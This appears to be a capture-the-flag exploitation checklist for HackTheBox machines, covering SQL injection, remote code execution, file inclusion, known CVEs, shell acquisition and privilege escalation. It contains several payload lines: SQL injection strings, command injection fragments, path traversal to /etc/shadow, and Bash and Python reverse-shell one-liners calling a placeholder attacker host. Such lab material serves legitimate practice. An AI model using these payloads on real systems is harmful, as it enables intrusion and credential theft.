# Exploitation Workflow

Systematic approach to vulnerability testing and exploitation for HackTheBox machines.

## Pre‑Exploitation Setup

- [ ] Review enumeration results
- [ ] Identify top vulnerability candidates (prioritize by CVSS, popularity, ease)
- [ ] Prepare tools: Burp Suite, Metasploit (if allowed), manual exploit code
- [ ] Set up shell handlers (nc, bash, meterpreter)

## Phase 1: Vulnerability Validation

- [ ] Confirm vulnerability exists (POC or manual test)
- [ ] Understand the vulnerability chain (input → processing → output)
- [ ] Identify what access level it grants (user, service account, system)

## Phase 2: Exploitation Techniques

### Web Application Exploits

- **SQL Injection (SQLi)**
  - Test parameter: `' OR '1'='1`, `' UNION SELECT ...`, time‑based blind, error‑based
  - Use sqlmap: `sqlmap -u "url" --data "params" --dbs`
  - Extract usernames/passwords, read files, execute commands

- **Remote Code Execution (RCE)**
  - Upload shells: PHP, JSP, ASP, etc.
  - Command injection: `; whoami`, `| id`, `$(command)`
  - Template injection: SSTI, JSTL, Thymeleaf
  - Deserialization exploits (Java, Python, .NET)

- **Local File Inclusion (LFI)**
  - Path traversal: `../../../etc/passwd`
  - Log poisoning to achieve RCE (LFI + write capability)
  - Read sensitive files: `/etc/passwd`, `/etc/shadow`, config files, SSH keys

- **Unprotected Functionality**
  - Access admin panels without authorization
  - Bypass authentication or authorization checks
  - Perform privileged actions

### System/Network Exploits

- **Known CVEs**
  - Research: `searchsploit <service> <version>`, Exploit-DB, GitHub
  - Download/adapt exploits
  - Test against target

- **Misconfigurations**
  - Default credentials
  - Open SMB shares
  - Exposed management interfaces
  - Weak permissions

- **Service‑Specific Exploits**
  - SMB: EternalBlue (MS17‑010), nullsessions
  - SSH: Version exploits, key extraction
  - FTP: Anonymous upload/download
  - DNS: Zone transfers, cache poisoning

## Phase 3: Shell Acquisition

- [ ] Establish reverse shell or bind shell
- [ ] Stabilize shell (interactive, TTY if possible)
- [ ] Confirm command execution (whoami, id, pwd)
- [ ] Check for shell restrictions (AppArmor, SELinux, etc.)

### Common Shell Methods

```bash
# Bash reverse shell
bash -i >& /dev/tcp/attacker-ip/port 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker-ip",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'

# nc listener
nc -lvnp port
```

## Phase 4: Post‑Exploitation (Initial Access)

- [ ] Enumerate current user and groups
- [ ] List available files and directories
- [ ] Identify sensitive files (config, credentials, SSH keys)
- [ ] Check for other users or services
- [ ] Map network interfaces and neighbors

## Phase 5: Privilege Escalation

See `privilege-escalation.md` for detailed techniques.

- [ ] Identify privesc vector (kernel exploit, SUID binary, sudo, cron jobs, etc.)
- [ ] Gain higher privileges (root/SYSTEM)
- [ ] Capture root/system flag

## Documentation During Exploitation

- Record the exact vulnerability or chain of vulnerabilities
- Document commands and outputs
- Capture proof (flags, /etc/passwd, etc.)
- Note any obstacles or unexpected behaviors

## Tools Reference

- **Burp Suite** – Web vulnerability testing, request manipulation
- **SQLMap** – Automated SQL injection testing
- **Metasploit** – Multi‑protocol exploitation framework
- **searchsploit** – Local exploit database search
- **curl/wget** – Manual HTTP requests
- **netcat (nc)** – Shell handler, networking
- **Python/Bash** – Custom exploit/payload scripting

## Common Pitfalls

- Skipping enumeration; not understanding the service/app fully
- Using exploits without understanding how they work
- Not checking for WAF/IDS/filtering
- Assuming credentials are invalid without proper testing
- Not testing with different HTTP methods (GET, POST, PUT, DELETE)

## Notes

- Always prefer understanding over blind exploitation.
- Adapt exploits to the target; public exploits may need modification.
- Keep payloads simple and test iteratively.
- Document failures; they often reveal the correct path.
